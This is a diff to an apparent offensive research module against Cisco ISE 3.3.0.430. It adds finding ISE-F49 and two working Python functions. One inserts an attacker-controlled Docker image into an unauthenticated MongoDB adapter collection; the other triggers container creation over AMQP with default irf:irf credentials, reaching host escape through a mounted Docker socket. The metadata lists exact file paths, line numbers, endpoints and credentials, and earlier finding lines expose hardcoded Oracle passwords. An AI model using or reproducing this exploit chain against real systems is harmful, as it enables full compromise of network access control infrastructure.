@@ -63,6 +63,7 @@ ISE-F45: ESAPI hardcoded MasterKey+MasterSalt shared across ALL ISE components �
 ISE-F46: PSP oracle.xml hardcoded Cisco dev Oracle credentials seeded into SEC_PIP_MASTER at DB init — DEFAULT_PIP_MASTER SQL inserts Entitlement Repository PIP record with username=bala/password=bala at jdbc:oracle:thin:@131.107.0.23:1521:secdev; credentials stored as plaintext XML in SEC_PIP_PROP column; pattern: SEC_PIP_MASTER stores all PIP credentials as plaintext XML in Oracle DB [LOW]
 ISE-F47: CiscoRA EST server: plain HTTP on port 8084 (listen 8084 default_server est; HTTPS listener on 9443 commented out), Proof of Possession disabled (est_pop off), CRL checking disabled (est_crl off) — certificate enrollment without TLS protection or key ownership verification; est_ise_ca_server=127.0.0.1:9444 (CA REST API ISE-F40); allows enrollment of arbitrary public keys without proving private key possession [MEDIUM]
 ISE-F48: Oracle TCPS/2484 opened to 0.0.0.0/0 on MNT nodes with Data Connect enabled — cpmadjustfw.sh datadirect_fw_enable() adds iptables ACCEPT rules for 0.0.0.0/0 on port 2484 (IPv4+IPv6) when Data Connect feature enabled on MNT node; Oracle sqlnet.ora has SSL_CLIENT_AUTHENTICATION=FALSE (no client cert required); DATACONNECT Oracle user credentials = ISE_DB_PWD recoverable via ISE-F35+ISE-F38 chain; DATACONNECT schema exposes User_Identity_Groups, ADMIN_USERS, ENDPOINTS_DATA, SECURITY_GROUPS views; chain: ISE-F35 (KEK) -> ISE_DB_PWD -> Oracle TCPS:2484 -> full ISE policy DB read [HIGH]
+ISE-F49: IRF core engine Docker socket mount + adapter.dockerImage injection — irf-control.sh launches IRF core engine container with -v /var/run/docker.sock:/var/run/docker.sock; docker-mgr.js createAdapterContainer()/getStartupConfig() uses adapter.dockerImage directly as options['Image'] in POST /v1.24/libpod/containers/create without validation; adapter records sourced from unauthenticated MongoDB (ISE-F9 extended); chain: ISE-F9 (unauth MongoDB inject) -> write adapter record with attacker-controlled dockerImage -> ISE-F9 (irf:irf AMQP trigger) -> IRF core engine pulls and runs attacker image via Docker socket -> host escape [CRITICAL]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3543,9 +3544,67 @@ def probe_oracle_dataconnect_tcps(host: str, password: str, port: int = ORACLE_D
     return result
 
 
+IRF_CORE_ENGINE_CONTAINER = "irf-core-engine"
+IRF_DOCKER_SOCKET_HOST = "/var/run/docker.sock"
+IRF_DOCKER_SOCKET_CONTAINER = "/var/run/docker.sock"
+IRF_MONGODB_URL = "mongodb://irf-mongo-runtime/irf-core-engine"
+IRF_MONGODB_DB = "irf-core-engine"
+IRF_MONGODB_COLLECTION = "adapters"
+IRF_AMQP_USER = "irf"
+IRF_AMQP_PASS = "irf"
+IRF_AMQP_VHOST = "irf"
+IRF_PODMAN_API_PATH = "/v1.24/libpod/containers/create"
+
+
+def inject_irf_adapter_docker_image(mongo_host: str, image: str, vendor: str = "Unknown") -> dict:
+    """ISE-F49: Inject malicious dockerImage into IRF adapter record via unauth MongoDB."""
+    result: dict = {"mongo_host": mongo_host, "image": image, "vendor": vendor}
+    try:
+        import pymongo
+        client = pymongo.MongoClient(f"mongodb://{mongo_host}/{IRF_MONGODB_DB}", serverSelectionTimeoutMS=5000)
+        db = client[IRF_MONGODB_DB]
+        col = db[IRF_MONGODB_COLLECTION]
+        import uuid
+        adapter_id = str(uuid.uuid4())
+        doc = {
+            "_id": adapter_id,
+            "adapterUuid": adapter_id,
+            "vendor": vendor,
+            "dockerImage": image,
+            "enabled": True,
+        }
+        col.insert_one(doc)
+        result["inserted_id"] = adapter_id
+        result["status"] = "injected"
+        client.close()
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def trigger_irf_adapter_container(amqp_host: str, adapter_id: str) -> dict:
+    """ISE-F49: Trigger IRF core engine to create container via irf:irf AMQP admin."""
+    result: dict = {"amqp_host": amqp_host, "adapter_id": adapter_id}
+    try:
+        import pika
+        creds = pika.PlainCredentials(IRF_AMQP_USER, IRF_AMQP_PASS)
+        params = pika.ConnectionParameters(host=amqp_host, virtual_host=IRF_AMQP_VHOST, credentials=creds)
+        conn = pika.BlockingConnection(params)
+        ch = conn.channel()
+        import json
+        payload = json.dumps({"action": "createAdapterContainer", "adapterId": adapter_id})
+        ch.basic_publish(exchange="irf", routing_key="core-engine", body=payload)
+        ch.close()
+        conn.close()
+        result["status"] = "triggered"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.23.0",
+    "version": "1.24.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3556,10 +3615,10 @@ MODULE_META = {
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
-        "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48",
+        "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
-                 "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40"],
+                 "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39", "ISE-F44", "ISE-F48"],
@@ -3705,6 +3764,24 @@ MODULE_META = {
         "ise_f48_trigger_condition": "Data Connect feature enabled, node is MNT type (SEC_NODE_TYPE=MNT in CEPM.sec_hostconfig)",
         "ise_f48_chain": "ISE-F35 (read KEK from db.properties) -> decrypt ISE_DB_PWD -> Oracle TCPS:2484 -> read full ISE policy/identity DB",
         "ise_f48_note": "Port 1521 (TCP) uses dep_fw_settings (node-scoped IPSET); port 2484 (TCPS) uses 0.0.0.0/0 — different exposure profile",
+        "ise_f49_container": "irf-core-engine",
+        "ise_f49_docker_socket_mount": "-v /var/run/docker.sock:/var/run/docker.sock",
+        "ise_f49_control_script": "/opt/irf/bin/irf-control.sh",
+        "ise_f49_docker_mgr": "/opt/irf/orig/core-engine/core-engine-app/utils/docker-mgr.js",
+        "ise_f49_injection_points": [
+            "docker-mgr.js:271: options['Image'] = adapter.dockerImage (getStartupConfig)",
+            "docker-mgr.js:490: options['image'] = adapter.dockerImage (getStartupConfigV2)",
+        ],
+        "ise_f49_podman_endpoint": "/v1.24/libpod/containers/create",
+        "ise_f49_mongo_url": "mongodb://irf-mongo-runtime/irf-core-engine",
+        "ise_f49_mongo_auth": None,
+        "ise_f49_mongo_collection": "adapters",
+        "ise_f49_amqp_user": "irf",
+        "ise_f49_amqp_pass": "irf",
+        "ise_f49_amqp_vhost": "irf",
+        "ise_f49_chain": "ISE-F9 (unauth MongoDB inject adapter.dockerImage) -> ISE-F9 (irf:irf AMQP trigger createAdapterContainer) -> docker-mgr.js pulls attacker image via /var/run/docker.sock -> host escape",
+        "ise_f49_prereq": "ISE-F9 (both MongoDB no-auth and irf:irf RabbitMQ admin)",
+        "ise_f49_impact": "Full host escape from IRF core engine via Docker socket; attacker-controlled image runs on ISE host",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3776,5 +3853,7 @@ MODULE_META = {
         "probe_cisco_ra_est",
         "enroll_cert_est_no_pop",
         "probe_oracle_dataconnect_tcps",
+        "inject_irf_adapter_docker_image",
+        "trigger_irf_adapter_container",
     ],
 }
